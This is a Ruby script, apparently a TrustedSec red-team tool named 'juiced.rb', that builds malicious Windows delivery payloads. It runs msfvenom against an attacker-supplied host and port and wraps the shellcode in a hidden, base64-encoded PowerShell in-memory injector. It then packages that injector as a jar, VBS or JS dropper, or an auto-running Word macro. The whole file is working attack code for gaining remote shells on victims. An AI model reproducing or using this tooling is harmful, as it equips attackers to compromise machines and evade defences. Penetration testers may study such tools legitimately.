#!/usr/bin/env ruby
#Andrew Bonstrom, Matthew Graber, TrustedSec group
require 'io/console'
require 'base64'
def usage
	puts "Usage: ruby juiced.rb MsfvenomPayload Lhost Lport payloadFlag PayloadName\n"
	puts "Note: Payload name required for jar file, and is not required for other payloads." 
	puts "Payload Options: jar, ps, macro, vbs, and js."
end
#######################################################################################################################
#Payload Functions Begin
#######################################################################################################################
#This first is for creating a jar file that executes the base64 encoded powershell syntax
def gen_jarFile (shellcode, fileName)
	#Strips out the \n char that unicorn adds at the end
	shellcode = shellcode.strip.gsub(/\s+/, ' ')
	#Building the .java one liner
	javaFile1 = 'import java.io.*;public class' + ' ' +fileName + '{public static void main(String args[]){try{Process p = Runtime.getRuntime().exec("' 
        javaFile2 = javaFile1 + shellcode + '");}catch(IOException e1){}}}'
	#Write the one liner to a file.Name.java
	File.open(fileName+".java", "w") do |f|     
		f.write(javaFile2)   
	end
	#Creates manifest file
	File.open("manifest.txt", "w") do |f|
		f.write('Main-Class: ' + 'fileName')
	end
	#Builds and executes command to compile .java into .class
	#Then it creates the jar file and cleans up
	exec ('javac ' + fileName + '.java&&jar -cvfm ' + fileName + '.jar manifest.txt ' + fileName + '.class&&rm -f '+ fileName + '.class ' + fileName + '.java manifest.txt')
end
#This second will create a fully copy/pasta word macro
def gen_Macro (content)
#Adds initial double quotes
	content = '"' + content
#Split every 200 chars and then rejoin with newline and string continuation in order to meet the string var limitation
	content = content.scan(/.{1,200}/).join("\" & _\r\n\"")
	content += '"'
#Splits the shellcode at the 4500 char point because thats roughly 24-25 lines for the first var
	first, second = content.slice!(0...4500), content
#Formats the output for the VBA macro
#Due to VBA restrictions for the number lines used during string concatenation of 24 lines we split
#the shell amongst two different variables and then concatenate the contents in a third variable
	puts "Option Explicit"
	puts "Sub GetShellcode()"
	puts    "\t" + "On Error Resume Next"
	puts    "\t" + "Dim wsh As Object\n"
	puts    "\t" + 'Set wsh = CreateObject("WScript.Shell")'
	puts    "\t" + "Dim f1 As String\n"
	puts    "\t" + "Dim f2 As String\n"
	puts    "\t" + "Dim f3 As String\n"
	puts    "\t" + "f1 = " + first + '"'
	puts    "\n"
	puts    "\t" + "f2 = " + '"' + second
	puts    "\t" + "f3 = f1 & f2\n"
	puts    "\t" + "wsh.Run f3, 0"
	puts    "\t" + "On Error GoTo 0"
	puts "End Sub"
	puts "Sub AutoOpen()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
	puts "Sub Workbook_Open()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
end
def gen_psCommand(base64Command)
	return base64Command 
end
def gen_jsFile(base64Command, fileName)
	str = 'var WshShell = new ActiveXObject("Wscript.Shell");WshShell.run("shellcode", 0, false);WScript.exit;'.to_s.sub("shellcode", base64Command)
	File.open(fileName + ".js", "w") do |f|
        	f.write(str)
        end
end
def gen_vbsFile(base64Command, fileName)
	str = 'CreateObject("Wscript.Shell").Run "shellcode", 0, False'.to_s.sub("shellcode", base64Command)
	        File.open(fileName + ".vbs", "w") do |f|
                f.write(str)
        	end
end
##################################################################################################################
#Payload Functions End
##################################################################################################################
#Formats Msfvenom output to byte code array
def format_shellcode(content)
	#Formats shellcode by replacing \ with ,0
	content = content.gsub!('\\', ",0")
	#Deletes instances of double quote
	content = content.delete ('"')
	#Deletes instances of semi colon
	content = content.delete (";")
	#Slices all content up until the first piece of byte code
	content = content.slice(content.index(",0x")..-1)
	#Strips out newline chars to create a single line	
	content = content.gsub("\n","")
	#Strips the first comma off
	content = content[1..-1]
	return content
end
#Creates msfvenom command based on user input so far
def generate_shellcode (payload, lhost, lport)
	newVar = ''
	formattedShellcode = ''
	#Build the msfvenom command from user input
	command = (" sudo /usr/local/share/msf/msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
	puts "Now running" +  command
	#Runs commands within sub process, sleeps for 5 seconds while msfvenom builds the shellcode and then assigns it to a variable
	IO.popen(command) do |f|
		sleep(5)
		newVar = f.read
	end
	#Msfvenom output is sent to format function
	formattedShellcode = format_shellcode(newVar)
	
	return formattedShellcode
end
def gen_command(shellcode)
	str = <<-EOS
	 #Sniped from Matthew Graber/TrustedSec's Unicorn.py
	$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = shellcodehere;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}
	EOS
	mainStr = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + Base64.strict_encode64(str.to_s.sub("shellcodehere", shellcode).encode("utf-16le"))
	return mainStr
end
#################################################################################
#Main
#################################################################################
if ARGV.empty?
	usage
else
	temp = generate_shellcode(ARGV[0],ARGV[1], ARGV[2])
	#Call function to base64 encode everything and issue out powershell command
	Command = gen_command(temp)
	#Case switch statement for different payload flags
	case ARGV[3]
	when "jar"
		puts "Now creating file with .jar extension, please check local directory."
		gen_jarFile(Command, ARGV[4])
	when "ps"
		puts gen_psCommand(Command)
	when "macro"
		puts "Now creating Copy/Pastable Word Macro...."
		gen_Macro(Command)
	when "js"
		puts "Now creating file with .js extension, please check local directory."
		gen_jsFile(Command, ARGV[4])
	when "vbs"
		puts "Now creating file with .vbs extension, please check local directory."
		gen_vbsFile(Command, ARGV[4])
	else
	puts "You forgot to specify a payload."
	end
end
